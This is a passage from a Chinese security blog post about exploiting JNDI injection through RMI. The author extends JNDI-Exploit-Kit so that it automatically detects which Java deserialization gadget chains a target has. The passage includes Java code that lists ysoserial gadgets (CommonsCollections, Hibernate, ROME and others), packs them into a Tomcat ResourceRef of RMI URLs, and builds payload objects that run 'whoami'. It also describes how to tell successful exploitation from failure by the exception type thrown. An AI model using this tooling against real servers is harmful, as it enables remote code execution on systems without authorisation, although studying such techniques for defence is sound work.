<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">       <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">           Object ex;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">//当返回类型为ExceptionalReturn则进行反序列化</span></span><br><span class="line">               ex = in.readObject();</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// An exception should have been received,</span></span><br><span class="line">           <span class="comment">// if so throw it, else flag error</span></span><br><span class="line">           <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">               exceptionReceivedFromServer((Exception) ex);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// Exception is thrown before fallthrough can occur</span></span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">           <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">               Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                   <span class="string">&quot;return code invalid: &quot;</span> + returnType);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123164332747.png" alt="image-20220123164332747"></p>
<p>​        但是由于我们构建了一个异常对象，在执行过程中会抛出异常。而我们在分析<code>RegistryContextFactory</code>时说过，只有当返回正常时才会停止，返回异常会继续请求其他的RMI地址，所以如果这样利用，只能把所有的反序列化利用链Fuzz一遍，我们并不知道哪个利用链可用。</p>
<h3 id="失败尝试一"><a href="#失败尝试一" class="headerlink" title="失败尝试一"></a>失败尝试一</h3><p>​        分析在<code>StreamRemoteCall#executeCall</code>的利用过程我发现，只要设置了<code>TransportConstants#ExceptionalReturn</code>都会进行反序列化，如果我们仅仅设置了这个字段，但是传入的是只是我们的恶意对象，能否绕过此处的报错？所以我对JRMPListener做了如下更改。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123165936128.png" alt="image-20220123165936128"></p>
<p>​        但是在反序列化结束后会判断我们传入的是否为异常对象，如果不是也会抛异常。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123170519541.png" alt="image-20220123170519541"></p>
<h3 id="失败尝试二"><a href="#失败尝试二" class="headerlink" title="失败尝试二"></a>失败尝试二</h3><p>​    继续分析发现<code>RegistryImpl_Stub#lookup</code>中也会进行反序列化，但是会将反序列化的结果转成Remote类型，如果我们返回的不是Remote的实现类也会导致异常。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123170713384.png" alt="image-20220123170713384"></p>
<h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>​        虽然我们不能直接通过是否继续请求来判断利用链存在，但是还是可以通过DNSLog的方式进行判断。我们可以在每次请求后获取DNSLog的结果，如果有返回值则代表利用链可用。</p>
<p>​        但是在编写好代码测试时惊喜的发现，在利用失败捕获异常时只会捕获<code>NamingException</code>类型的异常。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123211902767.png" alt="image-20220123211902767"></p>
<p>如果利用链没找到，会抛出<code>CommunicationException</code>异常，而这个异常是<code>NamingException</code>的子类，因此会被捕获</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123211745306.png" alt="image-20220123211745306"></p>
<p>​        如果利用成功，抛出的是其他类型的异常，则不会被捕获。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123212100060.png" alt="image-20220123212100060"></p>
<p>​        但是这里还有一个问题，有些利用类存在，但是由于JDK版本或者其他问题导致不能利用，比如<code>CC1</code>，这个时候也会抛出其他异常，但是并不能触发漏洞，所以在自动化探测的时候要将这些类去除掉。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123212510960.png" alt="image-20220123212510960"></p>
<p>​        大概测了下在CC链中<code>CC1</code>,<code>CC3</code>,<code>CC7</code>都不能使用。<code>CC1</code>和<code>CC3</code>都是因为JDK版本过高无法使用可以理解，但是在<code>CC7</code>中明明可以执行成功但是还是会返回<code>CommunicationException</code>异常。</p>
<p>​        其他的利用链也先不测试了，这里只大致说下思路。通过这种实现已经可以达到自动化探测部分利用链了。最终我们服务端请求中最后一个请求的<code>gadget</code>就是存在的利用链。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123214551140.png" alt="image-20220123214551140"></p>
<p>​        代码实现主要是在<code>JNDI-Exploit-Kit</code>基础上做了一点点小改进，主要是在if判断中继续加上了<code>execAllGadgat</code>方法。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123215431147.png" alt="image-20220123215431147"></p>
<p>​            在<code>execAllGadgat</code>方法中遍历已经添加的利用链并添加到引用对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String[] gadgets=<span class="keyword">new</span> String[]&#123;<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;CommonsCollections10&quot;</span>,<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;CommonsCollections8&quot;</span>,<span class="string">&quot;CommonsCollections9&quot;</span>,<span class="string">&quot;Hibernate1&quot;</span>,<span class="string">&quot;JBossInterceptors1&quot;</span>,<span class="string">&quot;JSON1&quot;</span>,<span class="string">&quot;JavassistWeld1&quot;</span>,<span class="string">&quot;Jdk7u21&quot;</span>,<span class="string">&quot;MozillaRhino1&quot;</span>,<span class="string">&quot;MozillaRhino2&quot;</span>,<span class="string">&quot;ROME&quot;</span>,<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;Jre8u20&quot;</span>&#125;;  </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">execAllGadgat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;xxxx&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="keyword">true</span>, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(String gadget:gadgets)&#123;</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;URL&quot;</span>,String.format(<span class="string">&quot;rmi://%s:1099/serial/%s&quot;</span>, ServerStart.rmi_addr,gadget)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​        由于我们的Payload并没有在<code>references</code>中添加，因此从Map中会获取不到，所以我这里加了一个判断，当object以ser开头，则表示是通过反序列化利用，给<code>reference</code>赋值。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123220109880.png" alt="image-20220123220109880"></p>
<p>​        最后再加上一个引用判断，如果以<code>serial</code>开头则取出调用链名称获取恶意对象直接写入。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220123215643229.png" alt="image-20220123215643229"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">execGadgets</span><span class="params">(String className)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">     Class clazz = Class.forName(<span class="string">&quot;ysoserial.payloads.&quot;</span>+className);</span><br><span class="line">     ObjectPayload&lt;?&gt; payload = (ObjectPayload&lt;?&gt;) clazz.newInstance();</span><br><span class="line">     <span class="keyword">final</span> Object objBefore = payload.getObject(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;exec_global&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> objBefore;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        虽然这次的小发现对于JNDI漏洞的利用来说可能有些画蛇添足，通过这几天的研究也发现了自己对RMI请求理解上的不足，最后对这种利用方式做一个总结。</p>
<ul>
<li>由于我们要传入一个ObjectFactory类名，所以需要一个Reference对象，但是JDK自带的只有<code>LinkRef</code>，不能传递ObjectFactory的类名，所以这里还是使用了tomcat中的<code>ResourceRef</code>,所以还是有些依赖Tomcat。</li>
<li>由于<code>LdapCtxFactory</code>最终没有调用Lookup方法，因此目前只能通过RMI协议来进行自动化检测</li>
<li>由于<code>CC1</code>,<code>CC3</code>,<code>CC7</code>无法通过返回的异常类型判断是否存在，所以不能检测这几条链。目前我只测了CC链，其他类型的利用链是否有异常未测试</li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/漏洞利用/">漏洞利用</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>